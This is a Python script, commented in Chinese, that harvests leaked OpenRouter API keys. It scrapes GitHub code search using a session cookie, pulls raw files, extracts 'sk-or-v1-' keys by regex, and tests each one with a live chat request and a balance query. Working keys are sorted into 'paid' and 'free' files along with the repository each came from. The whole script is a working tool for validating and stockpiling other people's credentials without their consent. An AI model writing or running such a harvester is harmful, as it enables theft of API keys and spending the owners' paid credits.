#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OpenRouter API 密钥扫描器
基于 GitHub Session Search，支持余额查询和分类保存
"""

import os
import re
import time
import threading
import concurrent.futures
from queue import Queue
import requests
from datetime import datetime
import random
import json

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# OpenRouter 配置
OPENROUTER_BASE_URL = "https://openrouter.ai/api/v1"
CHAT_URL = f"{OPENROUTER_BASE_URL}/chat/completions"
CREDITS_URL = f"{OPENROUTER_BASE_URL}/credits"
TEST_MODEL = "mistralai/mistral-7b-instruct:free"

# 并发配置
MAX_WORKERS = 10
API_DELAY = 1.0

# 存储结果
live_keys_queue = Queue()
processed_keys = set()
lock = threading.Lock()
file_lock = threading.Lock()

# 实时保存文件名 (Paid / Free)
paid_keys_filename = None
free_keys_filename = None

# --- OpenRouter API 验证 ---

def get_key_balance(key):
    """查询余额"""
    try:
        headers = {
            "Authorization": f"Bearer {key}",
            "Content-Type": "application/json"
        }
        resp = requests.get(CREDITS_URL, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if "data" in data:
                total_credits = float(data["data"].get("total_credits", 0))
                total_usage = float(data["data"].get("total_usage", 0))
                remaining = total_credits - total_usage
                return remaining
        return 0.0
    except:
        return 0.0

def check_openrouter_key(key):
    """验证 OpenRouter API 密钥"""
    if not key.startswith("sk-or-v1-"):
        return {"status": "无效格式", "type": "invalid"}
        
    try:
        headers = {
            "Authorization": f"Bearer {key}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://github.com/scanner",
        }
        
        # 1. 测试对话 (验证有效性)
        payload = {
            "model": TEST_MODEL,
            "messages": [{"role": "user", "content": "Hi"}],
            "max_tokens": 1
        }
        
        resp = requests.post(CHAT_URL, headers=headers, json=payload, timeout=15)
        
        if resp.status_code == 200:
            # 2. 查询余额
            balance = get_key_balance(key)
            status_msg = f"🟢 存活 | 余额: ${balance:.2f}"
            
            key_type = "paid" if balance > 1 else "free"
            
            return {
                "status": status_msg,
                "type": key_type, # 'paid' or 'free'
                "balance": balance
            }
            
        elif resp.status_code == 401:
            return {"status": "🔴 无效/已吊销", "type": "invalid"}
        elif resp.status_code == 402:
            return {"status": "🟡 余额不足", "type": "free"}
        elif resp.status_code == 429:
            return {"status": "🟡 速率限制", "type": "free"}
        else:
            return {"status": f"⚪ 未知状态: {resp.status_code}", "type": "unknown"}
            
    except Exception as e:
        return {"status": f"⚪ 异常: {str(e)}", "type": "error"}

# --- 核心功能 ---

def init_filenames():
    global paid_keys_filename, free_keys_filename
    if paid_keys_filename is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        paid_keys_filename = f'openrouter_paykey_{timestamp}.txt'
        free_keys_filename = f'openrouter_free_{timestamp}.txt'
        
        with open(paid_keys_filename, 'w', encoding='utf-8') as f:
            f.write("=== OpenRouter 付费密钥 (余额 > $1) ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
        with open(free_keys_filename, 'w', encoding='utf-8') as f:
            f.write("=== OpenRouter 免费/低余额密钥 (余额 <= $1) ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

def save_key_result(key_info):
    """根据余额分类保存"""
    init_filenames()
    
    target_file = paid_keys_filename if key_info['type'] == 'paid' else free_keys_filename
    
    with file_lock:
        with open(target_file, 'a', encoding='utf-8') as f:
            f.write(f"🔑 密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   来源: {key_info['url']}\n")
            f.write("-" * 60 + "\n")
            
        print(f"💾 已保存到 [{key_info['type']}]: {key_info['key'][:15]}...")

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def process_content_file(file_url, worker_id):
    try:
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200: return
        
        content = resp.text
        
        # 正则提取
        pattern = r'(sk-or-v1-[0-9a-fA-F]{63,64})'
        keys = re.findall(pattern, content)
        
        for key in keys:
            with lock:
                if key in processed_keys: continue
                processed_keys.add(key)
            
            print(f"[Worker-{worker_id}] 🔍 验证: {key[:15]}...")
            result = check_openrouter_key(key)
            print(f"[Worker-{worker_id}] 结果: {result['status']}")
            
            if result['type'] in ['paid', 'free']:
                info = {
                    'key': key,
                    'status': result['status'],
                    'type': result['type'],
                    'url': file_url
                }
                save_key_result(info)
                live_keys_queue.put(info)
                
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 异常: {e}")

def main():
    if not GITHUB_SESSION:
        print("❌ 错误: 请设置 GITHUB_SESSION")
        return

    print("🚀 开始 OpenRouter 扫描 (余额分类版)")
    
    # 搜索查询 (用户指定)
    queries = [
        r'/sk-or-v1-[0-9a-fA-F]{63,64}/',
        'sk-or-v1- openrouter',
        '"sk-or-v1-"'
    ]
    
    all_links = set()
    
    for q in queries:
        print(f"📡 搜索: {q}")
        for page in range(1, 6):
            try:
                url = "https://github.com/search"
                params = {'q': q, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
                resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
                
                if resp.status_code == 429:
                    time.sleep(60)
                    continue
                    
                links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
                if not links: break
                
                for link in links:
                    all_links.add("https://github.com" + link.split('#')[0])
                    
                print(f"   Page {page}: Found {len(links)} links")
                time.sleep(random.uniform(2, 5))
            except Exception as e:
                print(e)
                break
                
    print(f"✅ 共收集 {len(all_links)} 个文件，开始并发处理...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_content_file, url, i % MAX_WORKERS) for i, url in enumerate(all_links)]
        concurrent.futures.wait(futures)
        
    print("🏁 完成")

if __name__ == "__main__":
    main()
